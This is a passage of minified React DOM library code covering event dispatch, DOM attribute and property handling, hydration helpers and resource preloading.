                                tr = It; tr; tr = no(tr))
                                    Lt++;
                                for (; 0 < kt - Lt; )
                                    kr = no(kr),
                                    kt--;
                                for (; 0 < Lt - kt; )
                                    It = no(It),
                                    Lt--;
                                for (; kt--; ) {
                                    if (kr === It || It !== null && kr === It.alternate)
                                        break t;
                                    kr = no(kr),
                                    It = no(It)
                                }
                                kr = null
                            }
                        else
                            kr = null;
                        Ht !== null && Vd(rr, zt, Ht, kr, !1),
                        $r !== null && un !== null && Vd(rr, un, $r, kr, !0)
                    }
                }
                e: {
                    if (zt = Ut ? er(Ut) : window,
                    Ht = zt.nodeName && zt.nodeName.toLowerCase(),
                    Ht === "select" || Ht === "input" && zt.type === "file")
                        var Ar = Bn;
                    else if (Gr(zt))
                        if (go)
                            Ar = Rh;
                        else {
                            Ar = Sh;
                            var Hr = xh
                        }
                    else
                        Ht = zt.nodeName,
                        !Ht || Ht.toLowerCase() !== "input" || zt.type !== "checkbox" && zt.type !== "radio" ? Ut && Qt(Ut.elementType) && (Ar = Bn) : Ar = Eh;
                    if (Ar && (Ar = Ar(z, Ut))) {
                        fn(rr, Ar, le, Jt);
                        break e
                    }
                    Hr && Hr(z, zt, Ut),
                    z === "focusout" && Ut && zt.type === "number" && Ut.memoizedProps.value != null && Dr(zt, "number", zt.value)
                }
                switch (Hr = Ut ? er(Ut) : window,
                z) {
                case "focusin":
                    (Gr(Hr) || Hr.contentEditable === "true") && (Pa = Hr,
                    Su = Ut,
                    _o = null);
                    break;
                case "focusout":
                    _o = Su = Pa = null;
                    break;
                case "mousedown":
                    Eu = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    Eu = !1,
                    gc(rr, le, Jt);
                    break;
                case "selectionchange":
                    if (Mh)
                        break;
                case "keydown":
                case "keyup":
                    gc(rr, le, Jt)
                }
                var qr;
                if (yo)
                    e: {
                        switch (z) {
                        case "compositionstart":
                            var Pr = "onCompositionStart";
                            break e;
                        case "compositionend":
                            Pr = "onCompositionEnd";
                            break e;
                        case "compositionupdate":
                            Pr = "onCompositionUpdate";
                            break e
                        }
                        Pr = void 0
                    }
                else
                    Wt ? qt(z, le) && (Pr = "onCompositionEnd") : z === "keydown" && le.keyCode === 229 && (Pr = "onCompositionStart");
                Pr && (ot && le.locale !== "ko" && (Wt || Pr !== "onCompositionStart" ? Pr === "onCompositionEnd" && Wt && (qr = Ma()) : (ai = Jt,
                lo = "value"in ai ? ai.value : ai.textContent,
                Wt = !0)),
                Hr = Qs(Ut, Pr),
                0 < Hr.length && (Pr = new mo(Pr,z,null,le,Jt),
                rr.push({
                    event: Pr,
                    listeners: Hr
                }),
                qr ? Pr.data = qr : (qr = jt(le),
                qr !== null && (Pr.data = qr)))),
                (qr = De ? Er(z, le) : Ir(z, le)) && (Pr = Qs(Ut, "onBeforeInput"),
                0 < Pr.length && (Hr = new mo("onBeforeInput","beforeinput",null,le,Jt),
                rr.push({
                    event: Hr,
                    listeners: Pr
                }),
                Hr.data = qr)),
                lp(rr, z, Ut, le, Jt)
            }
            zd(rr, J)
        })
    }
    function Go(z, J, le) {
        return {
            instance: z,
            listener: J,
            currentTarget: le
        }
    }
    function Qs(z, J) {
        for (var le = J + "Capture", me = []; z !== null; ) {
            var Se = z
              , Oe = Se.stateNode;
            if (Se = Se.tag,
            Se !== 5 && Se !== 26 && Se !== 27 || Oe === null || (Se = oa(z, le),
            Se != null && me.unshift(Go(z, Se, Oe)),
            Se = oa(z, J),
            Se != null && me.push(Go(z, Se, Oe))),
            z.tag === 3)
                return me;
            z = z.return
        }
        return []
    }
    function no(z) {
        if (z === null)
            return null;
        do
            z = z.return;
        while (z && z.tag !== 5 && z.tag !== 27);
        return z || null
    }
    function Vd(z, J, le, me, Se) {
        for (var Oe = J._reactName, pt = []; le !== null && le !== me; ) {
            var bt = le
              , Mt = bt.alternate
              , Ut = bt.stateNode;
            if (bt = bt.tag,
            Mt !== null && Mt === me)
                break;
            bt !== 5 && bt !== 26 && bt !== 27 || Ut === null || (Mt = Ut,
            Se ? (Ut = oa(le, Oe),
            Ut != null && pt.unshift(Go(le, Ut, Mt))) : Se || (Ut = oa(le, Oe),
            Ut != null && pt.push(Go(le, Ut, Mt)))),
            le = le.return
        }
        pt.length !== 0 && z.push({
            event: J,
            listeners: pt
        })
    }
    var hp = /\r\n?/g
      , pp = /\u0000|\uFFFD/g;
    function Kd(z) {
        return (typeof z == "string" ? z : "" + z).replace(hp, `
`).replace(pp, "")
    }
    function Xd(z, J) {
        return J = Kd(J),
        Kd(z) === J
    }
    function Js() {}
    function sn(z, J, le, me, Se, Oe) {
        switch (le) {
        case "children":
            typeof me == "string" ? J === "body" || J === "textarea" && me === "" || jr(z, me) : (typeof me == "number" || typeof me == "bigint") && J !== "body" && jr(z, "" + me);
            break;
        case "className":
            dr(z, "class", me);
            break;
        case "tabIndex":
            dr(z, "tabindex", me);
            break;
        case "dir":
        case "role":
        case "viewBox":
        case "width":
        case "height":
            dr(z, le, me);
            break;
        case "style":
            Kt(z, me, Oe);
            break;
        case "data":
            if (J !== "object") {
                dr(z, "data", me);
                break
            }
        case "src":
        case "href":
            if (me === "" && (J !== "a" || le !== "href")) {
                z.removeAttribute(le);
                break
            }
            if (me == null || typeof me == "function" || typeof me == "symbol" || typeof me == "boolean") {
                z.removeAttribute(le);
                break
            }
            me = Fr("" + me),
            z.setAttribute(le, me);
            break;
        case "action":
        case "formAction":
            if (typeof me == "function") {
                z.setAttribute(le, "javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");
                break
            } else
                typeof Oe == "function" && (le === "formAction" ? (J !== "input" && sn(z, J, "name", Se.name, Se, null),
                sn(z, J, "formEncType", Se.formEncType, Se, null),
                sn(z, J, "formMethod", Se.formMethod, Se, null),
                sn(z, J, "formTarget", Se.formTarget, Se, null)) : (sn(z, J, "encType", Se.encType, Se, null),
                sn(z, J, "method", Se.method, Se, null),
                sn(z, J, "target", Se.target, Se, null)));
            if (me == null || typeof me == "symbol" || typeof me == "boolean") {
                z.removeAttribute(le);
                break
            }
            me = Fr("" + me),
            z.setAttribute(le, me);
            break;
        case "onClick":
            me != null && (z.onclick = Js);
            break;
        case "onScroll":
            me != null && Kr("scroll", z);
            break;
        case "onScrollEnd":
            me != null && Kr("scrollend", z);
            break;
        case "dangerouslySetInnerHTML":
            if (me != null) {
                if (typeof me != "object" || !("__html"in me))
                    throw Error(O(61));
                if (le = me.__html,
                le != null) {
                    if (Se.children != null)
                        throw Error(O(60));
                    z.innerHTML = le
                }
            }
            break;
        case "multiple":
            z.multiple = me && typeof me != "function" && typeof me != "symbol";
            break;
        case "muted":
            z.muted = me && typeof me != "function" && typeof me != "symbol";
            break;
        case "suppressContentEditableWarning":
        case "suppressHydrationWarning":
        case "defaultValue":
        case "defaultChecked":
        case "innerHTML":
        case "ref":
            break;
        case "autoFocus":
            break;
        case "xlinkHref":
            if (me == null || typeof me == "function" || typeof me == "boolean" || typeof me == "symbol") {
                z.removeAttribute("xlink:href");
                break
            }
            le = Fr("" + me),
            z.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", le);
            break;
        case "contentEditable":
        case "spellCheck":
        case "draggable":
        case "value":
        case "autoReverse":
        case "externalResourcesRequired":
        case "focusable":
        case "preserveAlpha":
            me != null && typeof me != "function" && typeof me != "symbol" ? z.setAttribute(le, "" + me) : z.removeAttribute(le);
            break;
        case "inert":
        case "allowFullScreen":
        case "async":
        case "autoPlay":
        case "controls":
        case "default":
        case "defer":
        case "disabled":
        case "disablePictureInPicture":
        case "disableRemotePlayback":
        case "formNoValidate":
        case "hidden":
        case "loop":
        case "noModule":
        case "noValidate":
        case "open":
        case "playsInline":
        case "readOnly":
        case "required":
        case "reversed":
        case "scoped":
        case "seamless":
        case "itemScope":
            me && typeof me != "function" && typeof me != "symbol" ? z.setAttribute(le, "") : z.removeAttribute(le);
            break;
        case "capture":
        case "download":
            me === !0 ? z.setAttribute(le, "") : me !== !1 && me != null && typeof me != "function" && typeof me != "symbol" ? z.setAttribute(le, me) : z.removeAttribute(le);
            break;
        case "cols":
        case "rows":
        case "size":
        case "span":
            me != null && typeof me != "function" && typeof me != "symbol" && !isNaN(me) && 1 <= me ? z.setAttribute(le, me) : z.removeAttribute(le);
            break;
        case "rowSpan":
        case "start":
            me == null || typeof me == "function" || typeof me == "symbol" || isNaN(me) ? z.removeAttribute(le) : z.setAttribute(le, me);
            break;
        case "popover":
            Kr("beforetoggle", z),
            Kr("toggle", z),
            sr(z, "popover", me);
            break;
        case "xlinkActuate":
            nr(z, "http://www.w3.org/1999/xlink", "xlink:actuate", me);
            break;
        case "xlinkArcrole":
            nr(z, "http://www.w3.org/1999/xlink", "xlink:arcrole", me);
            break;
        case "xlinkRole":
            nr(z, "http://www.w3.org/1999/xlink", "xlink:role", me);
            break;
        case "xlinkShow":
            nr(z, "http://www.w3.org/1999/xlink", "xlink:show", me);
            break;
        case "xlinkTitle":
            nr(z, "http://www.w3.org/1999/xlink", "xlink:title", me);
            break;
        case "xlinkType":
            nr(z, "http://www.w3.org/1999/xlink", "xlink:type", me);
            break;
        case "xmlBase":
            nr(z, "http://www.w3.org/XML/1998/namespace", "xml:base", me);
            break;
        case "xmlLang":
            nr(z, "http://www.w3.org/XML/1998/namespace", "xml:lang", me);
            break;
        case "xmlSpace":
            nr(z, "http://www.w3.org/XML/1998/namespace", "xml:space", me);
            break;
        case "is":
            sr(z, "is", me);
            break;
        case "innerText":
        case "textContent":
            break;
        default:
            (!(2 < le.length) || le[0] !== "o" && le[0] !== "O" || le[1] !== "n" && le[1] !== "N") && (le = pn.get(le) || le,
            sr(z, le, me))
        }
    }
    function Xl(z, J, le, me, Se, Oe) {
        switch (le) {
        case "style":
            Kt(z, me, Oe);
            break;
        case "dangerouslySetInnerHTML":
            if (me != null) {
                if (typeof me != "object" || !("__html"in me))
                    throw Error(O(61));
                if (le = me.__html,
                le != null) {
                    if (Se.children != null)
                        throw Error(O(60));
                    z.innerHTML = le
                }
            }
            break;
        case "children":
            typeof me == "string" ? jr(z, me) : (typeof me == "number" || typeof me == "bigint") && jr(z, "" + me);
            break;
        case "onScroll":
            me != null && Kr("scroll", z);
            break;
        case "onScrollEnd":
            me != null && Kr("scrollend", z);
            break;
        case "onClick":
            me != null && (z.onclick = Js);
            break;
        case "suppressContentEditableWarning":
        case "suppressHydrationWarning":
        case "innerHTML":
        case "ref":
            break;
        case "innerText":
        case "textContent":
            break;
        default:
            if (!yr.hasOwnProperty(le))
                e: {
                    if (le[0] === "o" && le[1] === "n" && (Se = le.endsWith("Capture"),
                    J = le.slice(2, Se ? le.length - 7 : void 0),
                    Oe = z[_t] || null,
                    Oe = Oe != null ? Oe[le] : null,
                    typeof Oe == "function" && z.removeEventListener(J, Oe, Se),
                    typeof me == "function")) {
                        typeof Oe != "function" && Oe !== null && (le in z ? z[le] = null : z.hasAttribute(le) && z.removeAttribute(le)),
                        z.addEventListener(J, me, Se);
                        break e
                    }
                    le in z ? z[le] = me : me === !0 ? z.setAttribute(le, "") : sr(z, le, me)
                }
        }
    }
    function Pn(z, J, le) {
        switch (J) {
        case "div":
        case "span":
        case "svg":
        case "path":
        case "a":
        case "g":
        case "p":
        case "li":
            break;
        case "img":
            Kr("error", z),
            Kr("load", z);
            var me = !1, Se = !1, Oe;
            for (Oe in le)
                if (le.hasOwnProperty(Oe)) {
                    var pt = le[Oe];
                    if (pt != null)
                        switch (Oe) {
                        case "src":
                            me = !0;
                            break;
                        case "srcSet":
                            Se = !0;
                            break;
                        case "children":
                        case "dangerouslySetInnerHTML":
                            throw Error(O(137, J));
                        default:
                            sn(z, J, Oe, pt, le, null)
                        }
                }
            Se && sn(z, J, "srcSet", le.srcSet, le, null),
            me && sn(z, J, "src", le.src, le, null);
            return;
        case "input":
            Kr("invalid", z);
            var bt = Oe = pt = Se = null
              , Mt = null
              , Ut = null;
            for (me in le)
                if (le.hasOwnProperty(me)) {
                    var Jt = le[me];
                    if (Jt != null)
                        switch (me) {
                        case "name":
                            Se = Jt;
                            break;
                        case "type":
                            pt = Jt;
                            break;
                        case "checked":
                            Mt = Jt;
                            break;
                        case "defaultChecked":
                            Ut = Jt;
                            break;
                        case "value":
                            Oe = Jt;
                            break;
                        case "defaultValue":
                            bt = Jt;
                            break;
                        case "children":
                        case "dangerouslySetInnerHTML":
                            if (Jt != null)
                                throw Error(O(137, J));
                            break;
                        default:
                            sn(z, J, me, Jt, le, null)
                        }
                }
            Ur(z, Oe, bt, Mt, Ut, pt, Se, !1),
            Or(z);
            return;
        case "select":
            Kr("invalid", z),
            me = pt = Oe = null;
            for (Se in le)
                if (le.hasOwnProperty(Se) && (bt = le[Se],
                bt != null))
                    switch (Se) {
                    case "value":
                        Oe = bt;
                        break;
                    case "defaultValue":
                        pt = bt;
                        break;
                    case "multiple":
                        me = bt;
                    default:
                        sn(z, J, Se, bt, le, null)
                    }
            J = Oe,
            le = pt,
            z.multiple = !!me,
            J != null ? Xe(z, !!me, J, !1) : le != null && Xe(z, !!me, le, !0);
            return;
        case "textarea":
            Kr("invalid", z),
            Oe = Se = me = null;
            for (pt in le)
                if (le.hasOwnProperty(pt) && (bt = le[pt],
                bt != null))
                    switch (pt) {
                    case "value":
                        me = bt;
                        break;
                    case "defaultValue":
                        Se = bt;
                        break;
                    case "children":
                        Oe = bt;
                        break;
                    case "dangerouslySetInnerHTML":
                        if (bt != null)
                            throw Error(O(91));
                        break;
                    default:
                        sn(z, J, pt, bt, le, null)
                    }
            en(z, me, Se, Oe),
            Or(z);
            return;
        case "option":
            for (Mt in le)
                if (le.hasOwnProperty(Mt) && (me = le[Mt],
                me != null))
                    switch (Mt) {
                    case "selected":
                        z.selected = me && typeof me != "function" && typeof me != "symbol";
                        break;
                    default:
                        sn(z, J, Mt, me, le, null)
                    }
            return;
        case "dialog":
            Kr("beforetoggle", z),
            Kr("toggle", z),
            Kr("cancel", z),
            Kr("close", z);
            break;
        case "iframe":
        case "object":
            Kr("load", z);
            break;
        case "video":
        case "audio":
            for (me = 0; me < Xo.length; me++)
                Kr(Xo[me], z);
            break;
        case "image":
            Kr("error", z),
            Kr("load", z);
            break;
        case "details":
            Kr("toggle", z);
            break;
        case "embed":
        case "source":
        case "link":
            Kr("error", z),
            Kr("load", z);
        case "area":
        case "base":
        case "br":
        case "col":
        case "hr":
        case "keygen":
        case "meta":
        case "param":
        case "track":
        case "wbr":
        case "menuitem":
            for (Ut in le)
                if (le.hasOwnProperty(Ut) && (me = le[Ut],
                me != null))
                    switch (Ut) {
                    case "children":
                    case "dangerouslySetInnerHTML":
                        throw Error(O(137, J));
                    default:
                        sn(z, J, Ut, me, le, null)
                    }
            return;
        default:
            if (Qt(J)) {
                for (Jt in le)
                    le.hasOwnProperty(Jt) && (me = le[Jt],
                    me !== void 0 && Xl(z, J, Jt, me, le, void 0));
                return
            }
        }
        for (bt in le)
            le.hasOwnProperty(bt) && (me = le[bt],
            me != null && sn(z, J, bt, me, le, null))
    }
    function mp(z, J, le, me) {
        switch (J) {
        case "div":
        case "span":
        case "svg":
        case "path":
        case "a":
        case "g":
        case "p":
        case "li":
            break;
        case "input":
            var Se = null
              , Oe = null
              , pt = null
              , bt = null
              , Mt = null
              , Ut = null
              , Jt = null;
            for (Ht in le) {
                var rr = le[Ht];
                if (le.hasOwnProperty(Ht) && rr != null)
                    switch (Ht) {
                    case "checked":
                        break;
                    case "value":
                        break;
                    case "defaultValue":
                        Mt = rr;
                    default:
                        me.hasOwnProperty(Ht) || sn(z, J, Ht, null, me, rr)
                    }
            }
            for (var zt in me) {
                var Ht = me[zt];
                if (rr = le[zt],
                me.hasOwnProperty(zt) && (Ht != null || rr != null))
                    switch (zt) {
                    case "type":
                        Oe = Ht;
                        break;
                    case "name":
                        Se = Ht;
                        break;
                    case "checked":
                        Ut = Ht;
                        break;
                    case "defaultChecked":
                        Jt = Ht;
                        break;
                    case "value":
                        pt = Ht;
                        break;
                    case "defaultValue":
                        bt = Ht;
                        break;
                    case "children":
                    case "dangerouslySetInnerHTML":
                        if (Ht != null)
                            throw Error(O(137, J));
                        break;
                    default:
                        Ht !== rr && sn(z, J, zt, Ht, me, rr)
                    }
            }
            Lr(z, pt, bt, Mt, Ut, Jt, Oe, Se);
            return;
        case "select":
            Ht = pt = bt = zt = null;
            for (Oe in le)
                if (Mt = le[Oe],
                le.hasOwnProperty(Oe) && Mt != null)
                    switch (Oe) {
                    case "value":
                        break;
                    case "multiple":
                        Ht = Mt;
                    default:
                        me.hasOwnProperty(Oe) || sn(z, J, Oe, null, me, Mt)
                    }
            for (Se in me)
                if (Oe = me[Se],
                Mt = le[Se],
                me.hasOwnProperty(Se) && (Oe != null || Mt != null))
                    switch (Se) {
                    case "value":
                        zt = Oe;
                        break;
                    case "defaultValue":
                        bt = Oe;
                        break;
                    case "multiple":
                        pt = Oe;
                    default:
                        Oe !== Mt && sn(z, J, Se, Oe, me, Mt)
                    }
            J = bt,
            le = pt,
            me = Ht,
            zt != null ? Xe(z, !!le, zt, !1) : !!me != !!le && (J != null ? Xe(z, !!le, J, !0) : Xe(z, !!le, le ? [] : "", !1));
            return;
        case "textarea":
            Ht = zt = null;
            for (bt in le)
                if (Se = le[bt],
                le.hasOwnProperty(bt) && Se != null && !me.hasOwnProperty(bt))
                    switch (bt) {
                    case "value":
                        break;
                    case "children":
                        break;
                    default:
                        sn(z, J, bt, null, me, Se)
                    }
            for (pt in me)
                if (Se = me[pt],
                Oe = le[pt],
                me.hasOwnProperty(pt) && (Se != null || Oe != null))
                    switch (pt) {
                    case "value":
                        zt = Se;
                        break;
                    case "defaultValue":
                        Ht = Se;
                        break;
                    case "children":
                        break;
                    case "dangerouslySetInnerHTML":
                        if (Se != null)
                            throw Error(O(91));
                        break;
                    default:
                        Se !== Oe && sn(z, J, pt, Se, me, Oe)
                    }
            cr(z, zt, Ht);
            return;
        case "option":
            for (var $r in le)
                if (zt = le[$r],
                le.hasOwnProperty($r) && zt != null && !me.hasOwnProperty($r))
                    switch ($r) {
                    case "selected":
                        z.selected = !1;
                        break;
                    default:
                        sn(z, J, $r, null, me, zt)
                    }
            for (Mt in me)
                if (zt = me[Mt],
                Ht = le[Mt],
                me.hasOwnProperty(Mt) && zt !== Ht && (zt != null || Ht != null))
                    switch (Mt) {
                    case "selected":
                        z.selected = zt && typeof zt != "function" && typeof zt != "symbol";
                        break;
                    default:
                        sn(z, J, Mt, zt, me, Ht)
                    }
            return;
        case "img":
        case "link":
        case "area":
        case "base":
        case "br":
        case "col":
        case "embed":
        case "hr":
        case "keygen":
        case "meta":
        case "param":
        case "source":
        case "track":
        case "wbr":
        case "menuitem":
            for (var kr in le)
                zt = le[kr],
                le.hasOwnProperty(kr) && zt != null && !me.hasOwnProperty(kr) && sn(z, J, kr, null, me, zt);
            for (Ut in me)
                if (zt = me[Ut],
                Ht = le[Ut],
                me.hasOwnProperty(Ut) && zt !== Ht && (zt != null || Ht != null))
                    switch (Ut) {
                    case "children":
                    case "dangerouslySetInnerHTML":
                        if (zt != null)
                            throw Error(O(137, J));
                        break;
                    default:
                        sn(z, J, Ut, zt, me, Ht)
                    }
            return;
        default:
            if (Qt(J)) {
                for (var un in le)
                    zt = le[un],
                    le.hasOwnProperty(un) && zt !== void 0 && !me.hasOwnProperty(un) && Xl(z, J, un, void 0, me, zt);
                for (Jt in me)
                    zt = me[Jt],
                    Ht = le[Jt],
                    !me.hasOwnProperty(Jt) || zt === Ht || zt === void 0 && Ht === void 0 || Xl(z, J, Jt, zt, me, Ht);
                return
            }
        }
        for (var It in le)
            zt = le[It],
            le.hasOwnProperty(It) && zt != null && !me.hasOwnProperty(It) && sn(z, J, It, null, me, zt);
        for (rr in me)
            zt = me[rr],
            Ht = le[rr],
            !me.hasOwnProperty(rr) || zt === Ht || zt == null && Ht == null || sn(z, J, rr, zt, me, Ht)
    }
    var Gl = null
      , Wl = null;
    function eu(z) {
        return z.nodeType === 9 ? z : z.ownerDocument
    }
    function Gd(z) {
        switch (z) {
        case "http://www.w3.org/2000/svg":
            return 1;
        case "http://www.w3.org/1998/Math/MathML":
            return 2;
        default:
            return 0
        }
    }
    function Wd(z, J) {
        if (z === 0)
            switch (J) {
            case "svg":
                return 1;
            case "math":
                return 2;
            default:
                return 0
            }
        return z === 1 && J === "foreignObject" ? 0 : z
    }
    function Yl(z, J) {
        return z === "textarea" || z === "noscript" || typeof J.children == "string" || typeof J.children == "number" || typeof J.children == "bigint" || typeof J.dangerouslySetInnerHTML == "object" && J.dangerouslySetInnerHTML !== null && J.dangerouslySetInnerHTML.__html != null
    }
    var Zl = null;
    function vp() {
        var z = window.event;
        return z && z.type === "popstate" ? z === Zl ? !1 : (Zl = z,
        !0) : (Zl = null,
        !1)
    }
    var Yd = typeof setTimeout == "function" ? setTimeout : void 0
      , yp = typeof clearTimeout == "function" ? clearTimeout : void 0
      , Zd = typeof Promise == "function" ? Promise : void 0
      , gp = typeof queueMicrotask == "function" ? queueMicrotask : typeof Zd < "u" ? function(z) {
        return Zd.resolve(null).then(z).catch(bp)
    }
    : Yd;
    function bp(z) {
        setTimeout(function() {
            throw z
        })
    }
    function Qi(z) {
        return z === "head"
    }
    function Qd(z, J) {
        var le = J
          , me = 0
          , Se = 0;
        do {
            var Oe = le.nextSibling;
            if (z.removeChild(le),
            Oe && Oe.nodeType === 8)
                if (le = Oe.data,
                le === "/$") {
                    if (0 < me && 8 > me) {
                        le = me;
                        var pt = z.ownerDocument;
                        if (le & 1 && Wo(pt.documentElement),
                        le & 2 && Wo(pt.body),
                        le & 4)
                            for (le = pt.head,
                            Wo(le),
                            pt = le.firstChild; pt; ) {
                                var bt = pt.nextSibling
                                  , Mt = pt.nodeName;
                                pt[wt] || Mt === "SCRIPT" || Mt === "STYLE" || Mt === "LINK" && pt.rel.toLowerCase() === "stylesheet" || le.removeChild(pt),
                                pt = bt
                            }
                    }
                    if (Se === 0) {
                        z.removeChild(Oe),
                        ns(J);
                        return
                    }
                    Se--
                } else
                    le === "$" || le === "$?" || le === "$!" ? Se++ : me = le.charCodeAt(0) - 48;
            else
                me = 0;
            le = Oe
        } while (le);
        ns(J)
    }
    function Ql(z) {
        var J = z.firstChild;
        for (J && J.nodeType === 10 && (J = J.nextSibling); J; ) {
            var le = J;
            switch (J = J.nextSibling,
            le.nodeName) {
            case "HTML":
            case "HEAD":
            case "BODY":
                Ql(le),
                At(le);
                continue;
            case "SCRIPT":
            case "STYLE":
                continue;
            case "LINK":
                if (le.rel.toLowerCase() === "stylesheet")
                    continue
            }
            z.removeChild(le)
        }
    }
    function _p(z, J, le, me) {
        for (; z.nodeType === 1; ) {
            var Se = le;
            if (z.nodeName.toLowerCase() !== J.toLowerCase()) {
                if (!me && (z.nodeName !== "INPUT" || z.type !== "hidden"))
                    break
            } else if (me) {
                if (!z[wt])
                    switch (J) {
                    case "meta":
                        if (!z.hasAttribute("itemprop"))
                            break;
                        return z;
                    case "link":
                        if (Oe = z.getAttribute("rel"),
                        Oe === "stylesheet" && z.hasAttribute("data-precedence"))
                            break;
                        if (Oe !== Se.rel || z.getAttribute("href") !== (Se.href == null || Se.href === "" ? null : Se.href) || z.getAttribute("crossorigin") !== (Se.crossOrigin == null ? null : Se.crossOrigin) || z.getAttribute("title") !== (Se.title == null ? null : Se.title))
                            break;
                        return z;
                    case "style":
                        if (z.hasAttribute("data-precedence"))
                            break;
                        return z;
                    case "script":
                        if (Oe = z.getAttribute("src"),
                        (Oe !== (Se.src == null ? null : Se.src) || z.getAttribute("type") !== (Se.type == null ? null : Se.type) || z.getAttribute("crossorigin") !== (Se.crossOrigin == null ? null : Se.crossOrigin)) && Oe && z.hasAttribute("async") && !z.hasAttribute("itemprop"))
                            break;
                        return z;
                    default:
                        return z
                    }
            } else if (J === "input" && z.type === "hidden") {
                var Oe = Se.name == null ? null : "" + Se.name;
                if (Se.type === "hidden" && z.getAttribute("name") === Oe)
                    return z
            } else
                return z;
            if (z = li(z.nextSibling),
            z === null)
                break
        }
        return null
    }
    function wp(z, J, le) {
        if (J === "")
            return null;
        for (; z.nodeType !== 3; )
            if ((z.nodeType !== 1 || z.nodeName !== "INPUT" || z.type !== "hidden") && !le || (z = li(z.nextSibling),
            z === null))
                return null;
        return z
    }
    function Jl(z) {
        return z.data === "$!" || z.data === "$?" && z.ownerDocument.readyState === "complete"
    }
    function xp(z, J) {
        var le = z.ownerDocument;
        if (z.data !== "$?" || le.readyState === "complete")
            J();
        else {
            var me = function() {
                J(),
                le.removeEventListener("DOMContentLoaded", me)
            };
            le.addEventListener("DOMContentLoaded", me),
            z._reactRetry = me
        }
    }
    function li(z) {
        for (; z != null; z = z.nextSibling) {
            var J = z.nodeType;
            if (J === 1 || J === 3)
                break;
            if (J === 8) {
                if (J = z.data,
                J === "$" || J === "$!" || J === "$?" || J === "F!" || J === "F")
                    break;
                if (J === "/$")
                    return null
            }
        }
        return z
    }
    var tc = null;
    function Jd(z) {
        z = z.previousSibling;
        for (var J = 0; z; ) {
            if (z.nodeType === 8) {
                var le = z.data;
                if (le === "$" || le === "$!" || le === "$?") {
                    if (J === 0)
                        return z;
                    J--
                } else
                    le === "/$" && J++
            }
            z = z.previousSibling
        }
        return null
    }
    function eh(z, J, le) {
        switch (J = eu(le),
        z) {
        case "html":
            if (z = J.documentElement,
            !z)
                throw Error(O(452));
            return z;
        case "head":
            if (z = J.head,
            !z)
                throw Error(O(453));
            return z;
        case "body":
            if (z = J.body,
            !z)
                throw Error(O(454));
            return z;
        default:
            throw Error(O(451))
        }
    }
    function Wo(z) {
        for (var J = z.attributes; J.length; )
            z.removeAttributeNode(J[0]);
        At(z)
    }
    var ni = new Map
      , th = new Set;
    function tu(z) {
        return typeof z.getRootNode == "function" ? z.getRootNode() : z.nodeType === 9 ? z : z.ownerDocument
    }
    var ki = se.d;
    se.d = {
        f: Sp,
        r: Ep,
        D: Rp,
        C: Ap,
        L: Mp,
        m: qp,
        X: Cp,
        S: Tp,
        M: kp
    };
    function Sp() {
        var z = ki.f()
          , J = Ks();
        return z || J
    }
    function Ep(z) {
        var J = Tt(z);
        J !== null && J.tag === 5 && J.type === "form" ? wf(J) : ki.r(z)
    }
    var io = typeof document > "u" ? null : document;
    function rh(z, J, le) {
        var me = io;
        if (me && typeof J == "string" && J) {
            var Se = Cr(J);
            Se = 'link[rel="' + z + '"][href="' + Se + '"]',
            typeof le == "string" && (Se += '[crossorigin="' + le + '"]'),
            th.has(Se) || (th.add(Se),
            z = {
                rel: z,
                crossOrigin: le,
                href: J
            },
            me.querySelector(Se) === null && (J = me.createElement("link"),
            Pn(J, "link", z),
            pr(J),
            me.head.appendChild(J)))
        }
    }
    function Rp(z) {
        ki.D(z),
        rh("dns-prefetch", z, null)
    }
    function Ap(z, J) {
        ki.C(z, J),
        rh("preconnect", z, J)
    }
    function Mp(z, J, le) {
        ki.L(z, J, le);
        var me = io;
        if (me && z && J) {
            var Se = 'link[rel="preload"][as="' + Cr(J) + '"]';
            J === "image" && le && le.imageSrcSet ? (Se += '[imagesrcset="' + Cr(le.imageSrcSet) + '"]',
            typeof le.imageSizes == "string" && (Se += '[imagesizes="' + Cr(le.imageSizes) + '"]')) : Se += '[href="' + Cr(z) + '"]';
            var Oe = Se;
            switch (J) {
            case "style":
                Oe = ao(z);
                break;
            case "script":
                Oe = oo(z)
            }
            ni.has(Oe) || (z = V({
                rel: "preload",
                href: J === "image" && le && le.imageSrcSet ? void 0 : z,
                as: J
            }, le),
            ni.set(Oe, z),
            me.querySelector(Se) !== null || J === "style" && me.querySelector(Yo(Oe)) || J === "script" && me.querySelector(Zo(Oe)) || (J = me.createElement("link"),
            Pn(J, "link", z),
            pr(J),
            me.head.appendChild(J)))
        }
    }
    function qp(z, J) {
        ki.m(z, J);
        var le = io;
        if (le && z) {
            var me = J && typeof J.as == "string" ? J.as : "script"
              , Se = 'link[rel="modulepreload"][as="' + Cr(me) + '"][href="' + Cr(z) + '"]'
              , Oe = Se;
            switch (me) {
            case "audioworklet":
            case "paintworklet":
            case "serviceworker":
            case "sharedworker":
            case "worker":
            case "script":
                Oe = oo(z)
            }
            if (!ni.has(Oe) && (z = V({
                rel: "modulepreload",
                href: z
            }, J),
            ni.set(Oe, z),
            le.querySelector(Se) === null)) {
                switch (me) {
                case "audioworklet":
                case "paintworklet":
                case "serviceworker":
                case "sharedworker":
                case "worker":
                case "script":
                    if (le.querySelector(Zo(Oe)))
                        return
                }
                me = le.createElement("link"),
                Pn(me, "link", z),
                pr(me),
                le.head.appendChild(me)
            }
        }
    }
    function Tp(z, J, le) {
        ki.S(z, J, le);
        var me = io;
        if (me && z) {
            var Se = Xt(me).hoistableStyles
              , Oe = ao(z);
            J = J || "default";
            var pt = Se.get(Oe);
            if (!pt) {
                var bt = {
                    loading: 0,
                    preload: null
                };
                if (pt = me.querySelector(Yo(Oe)))
                    bt.loading = 5;
                else {
                    z = V({
                        rel: "stylesheet",
                        href: z,
                        "data-precedence": J
                    }, le),
                    (le = ni.get(Oe)) && rc(z, le);
                    var Mt = pt = me.createElement("link");
                    pr(Mt),
                    Pn(Mt, "link", z),
                    Mt._p = new Promise(function(Ut, Jt) {
                        Mt.onload = Ut,
                        Mt.onerror = Jt
                    }
                    ),
                    Mt.addEventListener("load", function() {
                        bt.loading |= 1
                    }),
                    Mt.addEventListener("error", function() {
                        bt.loading |= 2
                    }),
                    bt.loading |= 4,
                    ru(pt, J, me)
                }
                pt = {
                    type: "stylesheet",
                    instance: pt,
                    count: 1,
                    state: bt
                },
                Se.set(Oe, pt)
            }
        }
    }
